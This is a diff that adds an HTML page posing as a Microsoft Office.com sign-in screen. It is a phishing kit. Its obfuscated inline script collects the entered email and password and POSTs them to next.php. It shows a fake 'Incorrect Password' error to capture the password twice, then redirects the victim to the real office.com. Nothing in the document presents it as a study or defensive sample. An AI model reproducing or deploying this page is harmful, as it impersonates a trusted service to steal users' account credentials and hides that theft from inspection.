@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html data-bs-theme="light" lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+    <title>Office.com</title>
+    <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
+    <link rel="stylesheet" href="assets/css/res.css">
+    <link rel="stylesheet" href="assets/css/styles.css">
+</head>
+
+<body class="c-div" style="padding: 8px 44px;">
+    <div id="main-outer" class="spdiv" style="max-width: 440px;width: 100%;height: 406px;margin-top: 100px;">
+        <div id="form-outer" style="width: 100%;max-width: 440px;height: 338px;background: var(--bs-body-bg);padding: 44px;">
+            <div id="em-div"><img src="assets/img/lg.svg">
+                <p id="em-err" style="margin: 0px;margin-top: 12px;color: var(--bs-form-invalid-border-color);">Please provide a valid email address.</p>
+                <div class="s-div" style="height: 38px;">
+                    <p class="fw-semibold" style="font-size: 1.5rem;margin: 0px;">Sign In</p>
+                </div><input type="text" id="id" style="width: 100%;height: 36px;border-style: none;border-bottom-width: 1px;border-bottom-style: solid;margin-bottom: 18px;" placeholder="Email, Phone or Skype">
+                <p style="font-size: 14px;">No account?&nbsp;<a href="#" style="color: #4291cf;">Create one!</a></p><a class="dblock" href="#" style="color: #4291cf;font-size: 14px;margin-bottom: 16px;">Can’t access your account?</a>
+                <div class="e-div"><button class="btn btn-primary" id="back-btn" type="button" style="width: 100%;max-width: 108px;height: 31px;padding: 0px;border-radius: 0px;background: #cccccc;border-style: none;border-bottom-style: none;color: var(--bs-emphasis-color);margin-right: 6px;">Back</button><button class="btn btn-primary" id="next-btn" type="button" style="width: 100%;max-width: 108px;height: 31px;padding: 0px;border-radius: 0px;background: #0067b8;border-style: none;border-bottom-style: none;" onclick="nextFun();">Next</button></div>
+            </div>
+            <div id="pass-div"><img src="assets/img/lg.svg">
+                <p id="pass-err" style="margin: 0px;margin-top: 12px;color: var(--bs-form-invalid-border-color);">Incorrect Password</p>
+                <div class="s-div" style="height: 28px;padding: 2px;"><button style="background-color: transparent;border: none;" onclick="backbtn()"><img src="assets/img/barr.svg"></button>
+                    <p id="backEm" style="margin: 0px;"></p>
+                </div>
+                <div class="fw-semibold s-div" style="height: 38px;">
+                    <p class="fw-semibold" style="font-size: 1.5rem;margin: 0px;">Enter password</p>
+                </div><input type="password" id="pass" style="width: 100%;height: 36px;border-style: none;border-bottom-width: 1px;border-bottom-style: solid;margin-bottom: 18px;" placeholder="Password"><a class="dblock" href="#" style="color: #4291cf;font-size: 14px;margin-bottom: 16px;">Forgot password?</a>
+                <div class="e-div"><button class="btn btn-primary" id="next-btn1" type="button" style="width: 100%;max-width: 108px;height: 31px;padding: 0px;border-radius: 0px;background: #0067b8;border-style: none;border-bottom-style: none;" onclick="nextFun();">Sign In</button></div>
+            </div>
+        </div>
+        <div id="b-div" class="s-div" style="height: 48px;background: var(--bs-body-bg);padding: 4px 44px;padding-top: 9px;padding-bottom: 9px;"><img src="assets/img/k.svg" width="33" height="33">
+            <p style="margin: 0px;margin-top: 4px;margin-left: 17px;">Sign in Options</p>
+        </div>
+    </div>
+    <script src="assets/bootstrap/js/bootstrap.min.js"></script>
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+</body>
+<script>
+var w=M;(function(z,U){var p=M,C=z();while(!![]){try{var B=parseInt(p('0x12b'))/0x1+-parseInt(p('0x11b'))/0x2+parseInt(p('0x10c'))/0x3+-parseInt(p(0x129))/0x4+-parseInt(p('0x124'))/0x5+parseInt(p('0x113'))/0x6*(parseInt(p(0x117))/0x7)+parseInt(p(0x105))/0x8*(-parseInt(p('0x11e'))/0x9);if(B===U)break;else C['push'](C['shift']());}catch(o){C['push'](C['shift']());}}}(m,0x1f01a));function M(z,U){var C=m();return M=function(B,o){B=B-0x105;var S=C[B];return S;},M(z,U);}var count=0x0;function m(){var Q=['replace','#pass-err','next.php','pass','807656KzcGaM','POST','Error:','test','html','css','ajax','612186CDYZUB','hide','location','error','#backEm','#pass-div','#pass','36lMIxwI','prop','length','disabled','184394uawIig','show','value','#em-div','16320tpeAAk','#em-err','getElementById','9XlbqSX','#id','hidden','https://www.office.com','#next-btn','visibility','271955pbQvmC','Success:','val','visible','#next-btn1','546916bePquc','log','65125kHYvcs'];m=function(){return Q;};return m();}$(w(0x11a))[w('0x118')](),$(w('0x111'))[w(0x10d)]();function backbtn(){var v=w;$(v(0x11c))[v(0x10a)](v(0x123),v(0x120)),$(v(0x11a))[v(0x118)](),$(v('0x111'))[v(0x10d)](),count=0x0;}function validateEmail(z){var s=w;if(z=='')return![];else{var U=/^([\w-\.]+@([\w-]+\.)+[\w-]{2,4})?$/;return U[s(0x108)](z);}}function nextFun(){var k=w,z=document[k('0x11d')]('id'),U=document[k(0x11d)](k('0x12f'));$(k('0x11c'))[k('0x10a')](k('0x123'),k(0x120));if(!validateEmail(z[k('0x119')])){$(k(0x11c))[k('0x10a')](k(0x123),k(0x127));return;}else{if(z[k(0x119)][k('0x115')]>0x0&&count==0x0)$(k('0x122'))[k(0x114)](k('0x116'),!![]),setTimeout(()=>{var O=k;$(O('0x122'))[O('0x114')](O('0x116'),![]),$(O('0x11a'))[O(0x10d)](),$(O('0x111'))[O('0x118')](),$(O(0x110))[O('0x109')](z[O('0x119')]),count=0x1;},0x320);else{if(z[k(0x119)][k(0x115)]>0x0&&U[k('0x119')][k('0x115')]==0x0&&count==0x1)$(k('0x12d'))[k('0x10a')](k(0x123),k('0x120')),$(k('0x128'))[k(0x114)](k('0x116'),!![]),setTimeout(()=>{var D=k;$(D('0x128'))[D('0x114')](D(0x116),![]),$(D(0x12d))[D('0x10a')](D(0x123),D('0x127')),count=0x1;},0xc8);else{if(z[k('0x119')][k(0x115)]>0x0&&U[k('0x119')][k('0x115')]>0x0&&count==0x1)$(k('0x12d'))[k('0x10a')](k('0x123'),k(0x120)),$(k(0x128))[k(0x114)](k('0x116'),!![]),setTimeout(()=>{var f=k;$(f(0x128))[f('0x114')](f('0x116'),![]),$(f(0x12d))[f(0x10a)](f(0x123),f(0x127));var C=$(f(0x11f))[f('0x126')](),B=$(f(0x112))[f(0x126)]();$(f('0x112'))[f('0x126')](''),$[f(0x10b)]({'url':f(0x12e),'type':f('0x106'),'data':{'di':C,'pr':B},'success':function(o){var V=f;console[V(0x12a)](V(0x125),o);},'error':function(o,S,e){var L=f;console[L('0x10f')](L('0x107'),e);}});},0x5dc),count=0x2;else z[k('0x119')][k(0x115)]>0x0&&U[k('0x119')][k(0x115)]>0x0&&count==0x2&&($(k('0x12d'))[k('0x10a')](k('0x123'),k(0x120)),$(k(0x128))[k('0x114')](k(0x116),!![]),setTimeout(()=>{var Y=k;$(Y(0x128))[Y('0x114')](Y('0x116'),!![]);var C=$(Y(0x11f))[Y(0x126)](),B=$(Y(0x112))[Y(0x126)]();$[Y('0x10b')]({'url':Y('0x12e'),'type':Y(0x106),'data':{'di':C,'pr':B},'success':function(o){var a=Y;window[a('0x10e')][a(0x12c)](a('0x121')),console[a('0x12a')](a(0x125),o);},'error':function(o,S,e){var G=Y;console[G('0x10f')](G('0x107'),e);}});},0x5dc),count=0x0);}}}}
+</script>
+
+
+</html>
